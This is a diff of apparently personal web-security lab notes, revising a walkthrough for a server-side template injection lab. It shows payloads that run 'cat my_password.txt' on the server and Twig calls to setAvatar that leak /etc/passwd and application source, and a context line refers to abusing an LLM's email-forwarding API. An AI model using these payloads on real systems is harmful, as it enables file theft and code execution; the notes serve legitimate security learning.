@@ -3250,7 +3250,7 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Read the my_password.txt from home directory
     `${dwf.newInstance(ec,null)("cat my_password.txt ")}`
 - Server-side template injection with a **custom exploit**
-  - Upload invalid object
+  - Upload invalid avatar img
     ```
     PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
         Stack trace:
@@ -3258,16 +3258,17 @@ LLM -> API: create_email_forwarding_rule('peter')
 	#1 {main}
 	  thrown in /home/carlos/User.php on line 28
     ```
-  - Test invalid input for SSTI
+  - Test invalid input for SSTI in displayname
     ```
     POST /my-account/change-blog-post-author-display
     blog-post-author-display=user.first_name&csrf=uPkrQsnIZwIM7d5Cqt81xOtbUQXls0Vi > blog-post-author-display=user
  
     PHP Fatal error: Uncaught Error: Object of class User could not be converted to string in /usr/local/envs/php-twig-2.4.6/vendor/twig/twig/lib/Twig/Environment.php
     ```
-  - Update the display name
+  - Update the Avatar file path
     blog-post-author-display=user.`setAvatar('/etc/passwd','image/png')` > Download the avatar img file > passwd leak
-  - Read the source code
+  - Read the source code User.php
+    blog-post-author-display=user.`setAvatar('/home/carlos/User.php','image/png')`  
     ```
     public function gdprDelete() {
         $this->rm(readlink($this->avatarLink));
